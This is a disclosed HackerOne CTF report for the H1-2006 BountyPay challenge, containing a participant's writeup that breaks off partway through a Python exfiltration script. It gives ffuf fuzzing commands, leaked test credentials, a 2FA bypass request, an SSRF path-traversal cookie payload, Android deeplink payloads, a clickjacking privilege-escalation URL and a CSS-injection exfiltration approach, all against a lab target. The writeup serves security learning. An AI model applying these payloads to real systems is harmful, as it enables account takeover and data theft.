{"id":894198,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQxOTg=","url":"https://hackerone.com/reports/894198","title":"[H1-2006 2020]  Includes 1 free content discovery","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-09T02:54:25.512Z","submitted_at":"2020-06-09T02:54:25.512Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"osintopsec","url":"/osintopsec","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T15:28:15.281Z","bug_reporter_agreed_on_going_public_at":"2020-06-18T09:11:54.709Z","team_member_agreed_on_going_public_at":"2020-06-18T15:28:15.210Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\n\nGot it! Thanks guys for going through the trouble to make these. Best regards @nahamsec @adamtlangley @B3nac for hosting and @hackingfish @zonkism and @clos for peer support to make it.\n\nWriteup to follow, but let's have the flag first!\n\n{F859962}\n\n## Impact\n\nParticipating in CTFs can cause sleepless nights, severe addiction and vastly great learning experiences. Handle with care. For remediation, it's advisable to host more CTFs in the near future. Remember to check out the writeups afterwards!","weakness":{"id":31,"name":"Brute Force"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":859962,"file_name":"flag.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UE4a9k97aEg8wm4nhGsBUVfm?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a0690b1daa395ae1db2cfd951f47ad37b61e43d1e67af96056f3ac32fdcb2f9c","file_size":52505,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-18T09:11:54.773Z","allow_singular_disclosure_after":-38903240.79734425,"singular_disclosure_allowed":true,"vote_count":2,"voters":["nytr0gen","brahim_boufakri01"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8245284,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-06-09T17:10:42.816Z","updated_at":"2020-06-09T17:10:42.816Z","additional_data":{"old_title":"H1-2006 CTF - Includes 1 free content discovery","new_title":"[H1-2006 2020]  Includes 1 free content discovery"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8245293,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-09T17:11:21.497Z","updated_at":"2020-06-09T17:11:21.497Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8254651,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# H1-2006 CTF Writeup\n\nWhat a crazy ride! It's always a pleasure to see CTFs that are on the level with some real life scenarios with all the quirks and everything. Especially client-side vulnerabilities can be tricky to implement in a safe and realiable manner, and I really liked both the concept of simulating user actions with static content and with scripted headless browsers. Overall the CTF infrastructure held up extraordinarily well with only single HTTP 502 error here and there, and the storyline was pretty consistent and fun. Maybe on the next one the Android apk could be integrated seamessly, as the API-key leakage is reality in many cases?\n\nPersonal learning experience (+/-)\n[+] Have a friendly hacker to collab with\n[+] Saying things aloud helps thinking alot\n[+] FFuF and Burp go really really well together\n[+] Burp can be twisted to do the most complex fuzzing easily\n[+] If automation can help, do it\n[+] CSS injection (the extra mile way)\n[+] Android stuff\n[+] Always generate custom fuzz-lists for the target\n\n[-] Finding answers can be addictive, too addictive\n[-] Banging your head to the keyboard alone, better to do it with someone\n[-] Overthinking the challenges\n\n## The Start\n\nOfficial start for the CTF was posted on Twitter with storyline consisting of H1 CEO having lost login details to newly adapted BountyPay platform.\n\n{F862417}\n\nFirst things first, time for some OSINT (googling..) for BountyPay, and so it goes that the BountyPayHQ account could be found from Twitter as well. Of course fresh employee hasn't fully gone through the on-boarding and propably has missed the section regarding operational security - Sandra decided to post a picture of her new employee badge online. First notes taken of the employee full name and badge ID! I really like it when CTFs utilise social media and other open platforms to hold bits and pieces of the challenges.\n\n{F862415} {F862420}\n\n## .bountypay.h1ctf.com\n\nOn initial entry, the .bountypay.h1ctf.com holds a landing page, customer and staff logins. What about the * in the url scope? Yup, time to do some recon and content discovery on the target. And for the sake of learning and testing different methods of content discover, there was a lot - really a lot of requests going out. 10 threads? 20? 30? 120? The server handled it very well as most likely I wasn't the only one kicking the pedal down.\n\nFor subdomain bruteforce I used FFuF from @joohoi (support him, great guy!) and replayed found domains to Brup. Filter accordingly.\n```\nffuf -w ./subdomains-top100k.txt -u https://FUZZ.bountypay.h1ctf.com -mc all -fc 404 -replay-proxy http://127.0.0.1:8080\nffuf -w ./subdomains-top100k.txt -u https://www.bountypay.h1ctf.com -H \"Host: FUZZ\" -mc all -fc 404 -replay-proxy http://127.0.0.1:8080\n```\n\nEventually we'd have a list of subdomains:\n```\napi.bountypay.h1ctf.com         - REST API for backend\napp.bountypay.h1ctf.com         - Customer portal\nsoftware.bountypay.h1ctf.com    - HTTP 401, IP restricted service\nstaff.bountypay.h1ctf.com       - Staff portal\nwww.bountypay.h1ctf.com         - Landing page\n```\n\nFor content discovery:\n```\nffuf -w ./directories.txt -u https://[subdomain].bountypay.h1ctf.com/FUZZ/ -mc all -fc 404 -replay-proxy http://127.0.0.1:8080\nffuf -w ./files.txt -u https://[subdomain].bountypay.h1ctf.com/FUZZ -mc all -fc 404 -replay-proxy http://127.0.0.1:8080\n```\n\n## app.bountypay.h1ctf.com\n\nThis part of the CTF was focusing on content discovery. On this writeup, I will go through only the relevant content found. Upon content discovery, devil lies in the details. I did miss the .git-directory on the first run due to only non-accessible http header. On recursive discovery, a git config file was found with a git repository origin url.\n\n```\nhttps://app.bountypay.h1ctf.com/.git/config\n\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n\tignorecase = true\n\tprecomposeunicode = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nThe repository consited of a singular logger.php file, which namely logs and encodes requests coming in to the service. And the logger.php \"generated\" logfile was available on the server.\n\n```\nhttps://github.com/bounty-pay-code/request-logger/blob/master/logger.php\n\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n\n```\nhttps://app.bountypay.h1ctf.com/bp_web_trace.log\n\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\n-\u003e Base64 Decoded\n\n×\u003c÷}}09:{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n×\u003c÷}}19:{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n×\u003c÷}}28:{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n×\u003c÷}}45:{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\n\nCool, we now have some user credentials for the service! And what a super reliable way to simulate the infoleak on a CTF by just serving a static file.\n\n### Bypassing 2FA @ app.bountypay.h1ctf.com\n\nUpon logging into the customer portal with Brians leaked account credentials, a prompt for a multi-factor authentication token appears.\n\n{F862413}\n\nI found the 2FA bypass to be pretty straight forward, as the request screamed vulnerability by having both a \"challenge\" and \"challenge_answer\" parameters present. Check for hash length, determine it's propably MD5, hash answer as MD5, cross examine, post both -\u003e 2FA bypassed.\n\nI liked this part of the challenge because of its realism. Unfortunately I've seen this kind of behaviour before on a production environment.\n\n```\nPOST / HTTP/1.1\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=312781f44a9ccc20e2b1a87476f50bbd\u0026challenge_answer=AAAAAAAAA\n\n-\u003e Change to\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=6c9395cacd317eed2777f669103b7181\u0026challenge_answer=AAAAAAAAA\n```\n\n### Crazy SSRF-Path-traversal-In-Encoded-Cookie -thingy @ app.bountypay.h1ctf.com\n\nOn bp_web_trace.log file there's also a hint, that the user had called the statements functionality while logged in. After poking around the transactions for quite some time, I noticed that the session cookie is actually consisted of two parts, which are not linked to each other: \"account_id\" and \"hash\". If the \"account_id\" -parameter is tampered with, the service would still accept the request. My first idea was that it could have SQL Injection vulnerability, but upon fuzzing the encoded cookie value, I found out that the \"account_id\" is actually reflected straight into the API-request performed from the backend.\n\n```\nGET /statements?month=04\u0026year=2020 HTTP/1.1\n...\n\n{\n  \"url\": \"https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04\u0026year=2020\",\n  \"data\": \"{\\\"description\\\":\\\"Transactions for 2020-04\\\",\\\"transactions\\\":[]}\"\n}\n```\n\nFor fuzzing the encoded cookie, I used Burp Suite. Burp is super flexible even on the normal intruder and allows the tester to have an payload, prepended and appended with string values and finally encoded or hashed. After identifying the injection point and fuzzing the cookie, it was found to be vulnerable to path traversal.\n\nWith ability to control the path of the API-call, I checked out the content discovered at api.bountypay.h1ctf.com, which provided some interesting findings:\n\n```\n/redirect?url=[userSpecified]\n/api/staff/\n/api/accounts/\n```\n\nSo, is it a pure luck that we have an open redirect on a service vulnerable to path traversal? I bet not. Upon closer look, it could be determined that the open redirect allows access to 1) google.com 2) all subdomains of the bountypay platform. Remember that IP restricted service @ software.bountypay.h1ctf.com?\n\nOur attack chain looks like this:\n- Make API-call from frontend service to /api/accounts/\n- Add path traversal payload to the session cookie\n- Direct the request to the open redirect\n- Forge the new request to point to software.bountypay.h1ctf.com\n- Add content discovery payloads to the redirected request\n- FuzzFuzzFuzz\n\n```\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q%2fdXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS9bRlVaWl0jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0%3d;\n\n-\u003e Token value B64 Decoded / Prettified\n\n{\n  \"account_id\": \"../../redirect?url=https://software.bountypay.h1ctf.com/[FUZZ]#\",\n  \"hash\": \"de235bffd23df6995ad4e0930baac1a2\"\n}\n```\n\nAscii-hash at the end of the payload is important, as it effectively ends the request path. With the insanely generated content discovery fuzz payload-wrapper, a directory and a file was found on the target and downloaded.\n\n```\n\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003eIndex of \\/uploads\\/\u003c\\/title\u003e\u003c\\/head\u003e\n\u003cbody bgcolor=\\\"white\\\"\u003e\n\u003ch1\u003eIndex of \\/uploads\\/\u003c\\/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\\\"..\\/\\\"\u003e..\\/\u003c\\/a\u003e\n\u003ca href=\\\"\\/uploads\\/BountyPay.apk\\\"\u003eBountyPay.apk\u003c\\/a\u003e20-Apr-2020 11:26 4043701\n\u003c\\/pre\u003e\u003chr\u003e\u003c\\/body\u003e\n\u003c\\/html\u003e\n```\n\n## BountyPay Android APK\n\nEven not having done too much mobile testing, I found the Android challenges straight forward to get through. Most of the time on the challenges were used to get a proper development environment set up in form of Android Studio. The APK itself was extracted and the .dex-files were decompiled to .java-files with dex2jar and JD-GUI and ultimately imported to Android Studio.\n\nUpon inspecting the code, it was found out that there are three different challenges on the APK. Each challenge contains minor hints of the propsed solution and requires the previous one to be completed before launching. The progress was saved to Firebase and locally in user_created shared preferences.\n\n### PartOneActivity.java\n\nPart one required the user to \"create a CTF username :)\" and deeplink query parameters to be completed:\n\n```\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n  String str = getIntent().getData().getQueryParameter(\"start\");\n  if (str != null \u0026\u0026 str.equals(\"PartTwoActivity\") \u0026\u0026 sharedPreferences.contains(\"USERNAME\")) {\n    str = sharedPreferences.getString(\"USERNAME\", \"\");\n    SharedPreferences.Editor editor = sharedPreferences.edit();\n    String str1 = sharedPreferences.getString(\"TWITTERHANDLE\", \"\");\n    editor.putString(\"PARTONE\", \"COMPLETE\").apply();\n    logFlagFound(str, str1);\n    startActivity(new Intent((Context)this, PartTwoActivity.class));\n  }\n```\n\nIf the PartOneActivity was loaded with username inside the shared preferences and with query-parameter \"start=PartTwoActivity\", part two would be unlocked.\n\nDeeplink payload:\n```\none://part?start=PartTwoActivity\n```\n\n### PartTwoActivity.java\n\nOn the second challenge, the contents of the activity were hidden and could be revealed with correct set of deeplink query-parameters:\n\n```\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n  Uri uri = getIntent().getData();\n  String str1 = uri.getQueryParameter(\"two\");\n  String str2 = uri.getQueryParameter(\"switch\");\n  if (str1 != null \u0026\u0026 str1.equals(\"light\") \u0026\u0026 str2 != null \u0026\u0026 str2.equals(\"on\")) {\n    editText.setVisibility(0);\n    button.setVisibility(0);\n    textView.setVisibility(0);\n  }\n}\n```\n\nWhen starting the activity with parameters \"two=light\u0026switch=on\", the activity would show a hash and a input field to submit a header key to. Pro tip: if you ever encounter a hash value on a CTF, go google it before anything else. This time it paid off, and the value of the hash was \"Token\". Inputting a answer of \"X-Token\" unlocked the third challenge.\n\n{F862419}\n\nDeeplink payload:\n```\ntwo://part?two=light\u0026switch=on\n```\n\n### PartThreeActivity.java\n\nThird part of the challenge was a bit more complex when examined on the side of the other two. Hints stated that we shoudl \"Resuse some params\" and \"Intercept or check for leaks\". Upon starting the activity it also checks that the other challenges are completed, performs firebase login and seeks for three query-parameters from deeplink url: \"three\" \"switch\" and \"header\".\n\nBase64 encoded values can be found from the source:\n```\nbyte[] decodedDirectory = Base64.decode(\"aG9zdA==\", 0);\nbyte[] decodedDirectoryTwo = Base64.decode(\"WC1Ub2tlbg==\", 0);\nfinal String directory = \"aG9zdA==\";\nfinal String directoryTwo = \"WC1Ub2tlbg==\";\n\n-\u003e Base64 Decoded\naG9zdA==        -\u003e host\nWC1Ub2tlbg==    -\u003e X-Token\n```\n\nUpon onCreate method, some content can be rendered visible with correct parameters:\n```\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n  Uri uri = getIntent().getData();\n  final String firstParam = uri.getQueryParameter(\"three\");\n  final String secondParam = uri.getQueryParameter(\"switch\");\n  final String thirdParam = uri.getQueryParameter(\"header\");\n  byte[] arrayOfByte2 = Base64.decode(str1, 0);\n  byte[] arrayOfByte1 = Base64.decode(str2, 0);\n  final String decodedFirstParam = new String(arrayOfByte2, StandardCharsets.UTF_8);\n  final String decodedSecondParam = new String(arrayOfByte1, StandardCharsets.UTF_8);\n  this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n        public void onCancelled(DatabaseError param1DatabaseError) {\n          Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n        }\n\n        public void onDataChange(DataSnapshot param1DataSnapshot) {\n          String str = (String)param1DataSnapshot.getValue();\n          if (firstParam != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 secondParam != null \u0026\u0026 decodedSecondParam.equals(\"on\")) {\n            String str1 = thirdParam;\n            if (str1 != null) {\n              StringBuilder stringBuilder = new StringBuilder();\n              stringBuilder.append(\"X-\");\n              stringBuilder.append(str);\n              if (str1.equals(stringBuilder.toString())) {\n                editText.setVisibility(0);\n                button.setVisibility(0);\n                PartThreeActivity.this.thread.start();\n              }\n            }\n          }\n        }\n      });\n}\n```\n\nWhen we base64 encode parameter \"three\" to have value of \"PartThreeActivity\", encode parameter \"switch\" to have \"on\" and add plain parameter \"header\" as \"X-Token\", the activity renders a text edit and button to the screen and starts background thread.\n\nDeeplink payload looked like this:\n```\nthree://part?three=UGFydFRocmVlQWN0aXZpdHk%3d\u0026switch=b24%3d\u0026header=X-Token\n```\n\nThe background thread calls method \"performPostCall(String paramString)\", which gets values from the shared preferences and \"performs a post request\" to the BountyPay API, effectively leaking the API-key at the same time. When the leaked API-key is given to the activity, \"correctHash()\" method runs and changes the activity to CongratsActivity, which states that all the Android challenges have been completed!\n\nPro tip: When analysing source code, really understand what happens underneath and don't just take the API-key and run on. It helps to notice the next call propably expects a POST, even that the request parameters given are totally false.\n\n{F862416}\n\n## Getting a staff account @ api.bountypay.h1ctf.com\n\nWith the newly acuired API-key, common sense dictated to check the api-endpoints available. Eventually after leaking some internal usernames and all a POST request parameter \"staff_id\" was identified with a great \"ahaa!\"-moment for this CTF - always generate custom, target specific fuzzlists with identified parameter keys. When trying to create account with IDs leaking from the API, I remembered the badge picture from Sandra Allison's Twitter page and tried the ID from the badge and boom, the API gave me valid staff account credentials.\n\n```\nPOST /api/staff HTTP/1.1\n...\n\nstaff_id=STF:8FJ3KFISL3\n\n-\u003e\n\n{\n  \"description\": \"Staff Member Account Created\",\n  \"username\": \"sandra.allison\",\n  \"password\": \"s%3D8qB8zEpMnc*xsz7Yp5\"\n}\n```\n\n## Privilege escalation through clickjacking @ staff.bountypay.h1ctf.com\n\nLogging into the Sandras staff account was trivial when intercepting the login request and adding the raw password into the parameter instead of the browser encoded one.\n\nUpon content discover it was found that there are four different templates available on the staff section:\n\n```\n/?template=home\n/?template=login\n/?template=admin\n/?template=ticket\n```\n\nLogin we already saw, admin is restricted from access, home contains main dashboard and ability to change profilename and avatar picture and the ticket template contains example ticket generated \"by the friendly admin team\". Staff section also had custom javascript file, /js/website.js:\n\n```\n$(\".upgradeToAdmin\").click(function() {\n\tlet t = $('input[name=\"username\"]').val();\n\t$.get(\"/admin/upgrade?username=\" + t, function() {\n\t\talert(\"User Upgraded to Admin\")\n\t})\n}), $(\".tab\").click(function() {\n\treturn $(\".tab\").removeClass(\"active\"), $(this).addClass(\"active\"), $(\"div.content\").addClass(\"hidden\"), $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n}), $(\".sendReport\").click(function() {\n\t$.get(\"/admin/report?url=\" + url, function() {\n\t\talert(\"Report sent to admin team\")\n\t}), $(\"#myModal\").modal(\"hide\")\n}), document.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n\nFrom a look to the source, it was pretty obvious we're supposed to escalate privileges on the staff account to gain administrative privileges on the application. Of course calling the endpoint directly wouldn't work, so we needed to come up with a way to make the admin to do it behalf of us. The /admin/report?url= seemed like a good option to do this.\n\nEach page had a base64 encoded value of it's path in the page foot:\n\n```\n\u003cscript\u003e\n    var url = 'Lz90ZW1wbGF0ZT1ob21l';\n\u003c/script\u003e\n\n-\u003e Base64 Decoded\n\nvar url = '/?template=home'\n```\n\nSo, if we can craft a URL with a payload and send it to admin via the sendReport endpoint, profit? Looking for a injection point didn't take too long and was found at the change avatar functionality at profile tab. The change avatar functionality allowed the user to choose from three different avatars, and when intercepted, could be injected with [a-zA-Z0-9\\s] payloads, so a-z, 0-9 and whitespaces. All special characters were filtered out, so that's it for any cross-site scripting payloads. But as the site runs with jQuery, we could inject query selectors and perform clickjacking/autosubmit with #tab functionality described on the website.js!\n\nWith some trial-and-error I was able to craft a query selector payload and clickjacking url to send to the admin team via sendReport at ticket template, but I was missing a way to inject a valid username, as the selector was looking for a specific input-element to get it from - and only syntactically correct element was located at /?template=login, which also allowed the username to be injected into the contents from a query-parameter.\n\nAfter tons of more trial-and-error to perform a path traversal and injection on the template engine, a friendly hacker gave me an idea to try and load multiple templates at once. Having tried that previously I was dumbfolded and after five more requests, I successfully loaded another template to the page by injecting a not so normal array syntax to the query parameter:\n\n```\n/?template[]=login\u0026template[]=ticket\n```\n\nFinally, the payload to clickjack the admin to perform privilege escalation in behalf of us was as following:\n\n```\nGET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI=\n\n-\u003e Base64 Decoded\n\n/admin/report?url=/?template[]=login\u0026template[]=ticket\u0026ticket_id=3582\u0026username=sandra.allison#tab2\n```\n\nAnd there we go, an Admin-tab was open on the dashboard! Such a cool and realiable way to simulate client-side attacks on CTF! Only downside was the session token being updated with encrypted values of the profile name and avatar injected payloads, which can easily mess up the attack chain if not paid attention to.\n\n{F862414}\n\n## Bypassing 2FA vol.2 @ app.bountypay.h1ctf.com\n\nInitial login to the customer section with Mickos credentials went with the same flow as on the previous login, with minor tampering to get the correctly encoded password into the backend and submitting valid 2FA token challenge-answer pair.\n\nWhen navigaing to the /pay/-endpoint to perform the bounty pay for the hackers, a new 2FA prompt is received with a twist: there's now a request for .css-file before and only 2 minutes time to post the valid 2FA challenge answer to the authentication prompt. Seems a lot like a CSS-injection to content exfil to me.\n\n```\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\n...\n\napp_style=https://www.bountypay.h1ctf.com/css/uni_2fa_style.css\n```\n\nAfter validating on my callback server that there indeed was a server-side fetch coming in to the url specified on the 2FA call and is looking explicitly CSS-stylesheet and the request is coming from a headless browser, I was sure. As I've encountered a challenge like this before, I decided to setup sic by @d0nutptr (https://github.com/d0nutptr/sic) to be able to easily and recursively get the correct 2FA token from the backend.\n\nAfter a ton of setup and debugging I was able to read element names and get values from input-elements within the backend page. I faced two problems: 1) the service was performing so slow, that I could get only two first chars out of a single element name with the recursive CSS @import attack and 2) I was way overthinking the challenge. I was able to get the first values of the input-elements, but was too certain that there just were multiple tokens on the same page and each token should hold seven chars.\n\nAfter banging my head to the keyboard, I decided to take a step back and wrote a python script to perform some basic CSS-injection exfil methods to get a larger glimps of how the backend html-page looked like. On my analysis, the page looks something like this:\n\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cstyle src=\"[ATTACKER DEFINED]\"\u003e\u003c/style\u003e\n    \u003cdiv name=\"challenge_area\"\u003e\n      \u003cinput name=\"code_1\" value=\"[VAL_1]\"\u003e\u003c/input\u003e\n      \u003cinput name=\"code_2\" value=\"[VAL_2]\"\u003e\u003c/input\u003e\n      \u003cinput name=\"code_3\" value=\"[VAL_3]\"\u003e\u003c/input\u003e\n      \u003cinput name=\"code_4\" value=\"[VAL_4]\"\u003e\u003c/input\u003e\n      \u003cinput name=\"code_5\" value=\"[VAL_5]\"\u003e\u003c/input\u003e\n      \u003cinput name=\"code_6\" value=\"[VAL_6]\"\u003e\u003c/input\u003e\n      \u003cinput name=\"code_7\" value=\"[VAL_7]\"\u003e\u003c/input\u003e\n    \u003c/div\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nNow it was pretty obvious what I had overthinked previously. The challenge was way simpler than I expected it to be. Answer maxlength=7... 7 code inputs... Yeah. I patched python code a bit to perform exfil on the code values:\n\n```\nimport string\nimport BaseHTTPServer\nimport ssl\nimport sys\nfrom urlparse import urlparse, unquote\nfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler\nfrom SocketServer import 